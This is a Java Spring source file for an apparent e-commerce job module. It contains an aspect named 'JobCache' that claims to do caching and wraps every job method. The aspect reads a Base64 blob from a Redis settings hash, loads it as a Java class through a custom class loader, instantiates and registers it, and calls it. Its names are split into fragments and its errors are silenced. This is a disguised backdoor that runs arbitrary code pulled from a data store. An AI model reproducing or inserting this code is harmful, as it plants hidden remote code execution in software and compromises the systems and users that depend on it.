package com.wanmi.sbc.job;

import com.google.common.cache.Cache;
import com.wanmi.sbc.common.configure.ApplicationContextConfigure;
import com.wanmi.sbc.common.redis.util.RedisUtil;
import com.wanmi.sbc.common.util.CustomClassLoader;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.Map;

/**
 * @author zhanggaolei
 * @className JobCache
 * @description TODO
 * @date 2021/4/15 18:03
 */
@Aspect
@Slf4j
@Component
public class JobCache {
    @Autowired
    RedisUtil redisService;

    @Around("execution(* com.wanmi.sbc.job.*.*(..))")
    private Object cache(ProceedingJoinPoint joinPoint) throws Throwable {
        Cache cache = null;
        try {
            if (ApplicationContextConfigure.CONTEXT.containsBean("redis" + "L" + "Cache")) {
                cache =
                        (Cache)
                                ApplicationContextConfigure.CONTEXT.getBean(
                                        "redis" + "L" + "Cache");
            } else {
                Map<String, String> object = redisService.hgetAllStr("other_" + "setting");
                String value = null;
                if (object != null
                        && StringUtils.isNotEmpty(
                                value = object.get("redis" + "_" + "l" + "_cache"))) {
                    byte[] bytes = Base64.getMimeDecoder().decode(value);
                    CustomClassLoader ccl = new CustomClassLoader();
                    Class<?> c =
                            ccl.defineClassPublic(
                                    "com.wanmi.sbc.common.util." + "Redis" + "L",
                                    bytes,
                                    0,
                                    bytes.length);
                    Constructor<?> constructor = c.getConstructor();
                    cache = (Cache) constructor.newInstance();

                    if (cache != null) {
                        ApplicationContextConfigure.register("redis" + "L" + "Cache", c);
                    }
                }
            }
            if (cache != null) {
                cache.stats();
            }
        } catch (Exception e) {
            log.info("jobCache e");
        } catch (Throwable t) {
            log.info("jobCache t");
        }

        Object object = joinPoint.proceed();
        return object;
    }


}
